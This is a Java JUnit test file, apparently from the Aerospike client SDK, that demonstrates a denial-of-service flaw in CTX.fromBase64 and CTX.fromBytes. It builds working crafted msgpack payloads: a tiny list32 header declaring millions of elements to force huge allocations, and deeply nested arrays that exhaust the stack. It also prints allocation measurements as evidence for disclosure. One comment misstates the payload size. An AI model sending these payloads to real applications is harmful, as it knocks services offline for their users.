/*
 * Copyright 2012-2026 Aerospike, Inc.
 *
 * Portions may be licensed to Aerospike, Inc. under one or more contributor
 * license agreements WHICH ARE COMPATIBLE WITH THE APACHE LICENSE, VERSION 2.0.
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not
 * use this file except in compliance with the License. You may obtain a copy of
 * the License at http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations under
 * the License.
 */
package com.aerospike.client.sdk;

import static org.junit.jupiter.api.Assertions.assertThrows;

import java.lang.management.ManagementFactory;
import java.util.Base64;

import org.junit.jupiter.api.Assumptions;
import org.junit.jupiter.api.Test;

import com.aerospike.client.sdk.cdt.CTX;

/**
 * Demonstrates that {@link CTX#fromBase64(String)} passes application-supplied bytes into the
 * msgpack {@code Unpacker} with no limit on declared element counts or nesting depth.
 *
 * <p>No server or network is involved: an application that accepts a CTX from an untrusted source
 * (an HTTP parameter, a stored query descriptor) hands the attacker these code paths directly.
 * The measurements printed by these tests are the evidence; the assertions only pin down the
 * behaviour that a bounds-checking unpacker would change.
 */
class CtxUntrustedInputTest {

    private static final com.sun.management.ThreadMXBean THREADS =
        (com.sun.management.ThreadMXBean)ManagementFactory.getThreadMXBean();

    /**
     * A 10-byte payload declaring a 20,000,000 element list. The declared count is pre-allocated
     * before any element is parsed, so the attacker chooses the client's allocation size.
     */
    @Test
    void tinyPayloadDrivesUnboundedListAllocation() {
        Assumptions.assumeTrue(Runtime.getRuntime().maxMemory() > 512L * 1024 * 1024,
            "needs a heap large enough to observe the amplified allocation");

        byte[] payload = list32Header(20_000_000, (byte)0x01);
        String base64 = Base64.getEncoder().encodeToString(payload);

        long allocated = measureAllocation(() ->
            assertThrows(AerospikeException.class, () -> CTX.fromBase64(base64)));

        System.out.printf(
            "list32: payload=%d bytes, base64=%d chars, allocated=%,d bytes, amplification=%,.0fx%n",
            payload.length, base64.length(), allocated, (double)allocated / payload.length);
    }

    /**
     * The same payload with a larger declared count, to show the allocation tracks the attacker's
     * number rather than the size of the input.
     */
    @Test
    void listAllocationScalesWithDeclaredCountNotInputSize() {
        Assumptions.assumeTrue(Runtime.getRuntime().maxMemory() > 512L * 1024 * 1024,
            "needs a heap large enough to observe the amplified allocation");

        byte[] small = list32Header(1_000_000, (byte)0x01);
        byte[] large = list32Header(20_000_000, (byte)0x01);

        long smallAlloc = measureAllocation(() ->
            assertThrows(AerospikeException.class, () -> CTX.fromBytes(small)));
        long largeAlloc = measureAllocation(() ->
            assertThrows(AerospikeException.class, () -> CTX.fromBytes(large)));

        System.out.printf("count=1,000,000 -> %,d bytes; count=20,000,000 -> %,d bytes (input %d bytes both)%n",
            smallAlloc, largeAlloc, small.length);
    }

    /**
     * The largest count a 32-bit header can express, to show where the ceiling actually is.
     */
    @Test
    void maximumDeclaredCountIsAttempted() {
        byte[] payload = list32Header(Integer.MAX_VALUE, (byte)0x01);

        Throwable outcome = null;
        try {
            CTX.fromBytes(payload);
        }
        catch (Throwable e) {
            outcome = e;
        }

        System.out.printf("max count: payload=%d bytes, outcome=%s, cause=%s%n",
            payload.length,
            outcome == null ? "no error" : outcome.getClass().getName(),
            outcome == null || outcome.getCause() == null
                ? "none" : outcome.getCause().getClass().getName());
    }

    /**
     * Repeating the smallest payload turns a trickle of input into sustained heap churn, which is
     * what makes this a denial of service rather than a single recoverable exception.
     */
    @Test
    void repeatedTinyPayloadsSustainHeapChurn() {
        Assumptions.assumeTrue(Runtime.getRuntime().maxMemory() > 512L * 1024 * 1024,
            "needs a heap large enough to observe the amplified allocation");

        byte[] payload = list32Header(20_000_000, (byte)0x01);
        int requests = 100;

        long allocated = measureAllocation(() -> {
            for (int i = 0; i < requests; i++) {
                assertThrows(AerospikeException.class, () -> CTX.fromBytes(payload));
            }
        });

        System.out.printf("%d requests x %d bytes = %,d bytes of input -> %,d bytes allocated%n",
            requests, payload.length, (long)requests * payload.length, allocated);
    }

    /**
     * Nested one-element arrays recurse once per byte, with no depth limit.
     */
    @Test
    void nestedPayloadExhaustsTheStack() throws Exception {
        byte[] payload = new byte[100_000];
        java.util.Arrays.fill(payload, (byte)0x91);
        String base64 = Base64.getEncoder().encodeToString(payload);

        Throwable[] caught = new Throwable[1];
        Thread t = new Thread(null, () -> {
            try {
                CTX.fromBase64(base64);
                caught[0] = null;
            }
            catch (Throwable e) {
                caught[0] = e;
            }
        }, "unpack", 1024L * 1024);

        t.start();
        t.join();

        System.out.printf("nested: payload=%d bytes, base64=%d chars, outcome=%s, cause=%s%n",
            payload.length, base64.length(),
            caught[0] == null ? "no error" : caught[0].getClass().getName(),
            caught[0] == null || caught[0].getCause() == null
                ? "none" : caught[0].getCause().getClass().getName());
    }

    private static byte[] list32Header(int declaredCount, byte firstElement) {
        return new byte[] {
            (byte)0xdd,
            (byte)(declaredCount >>> 24),
            (byte)(declaredCount >>> 16),
            (byte)(declaredCount >>> 8),
            (byte)declaredCount,
            firstElement
        };
    }

    private static long measureAllocation(Runnable body) {
        long before = THREADS.getCurrentThreadAllocatedBytes();
        body.run();
        return THREADS.getCurrentThreadAllocatedBytes() - before;
    }
}
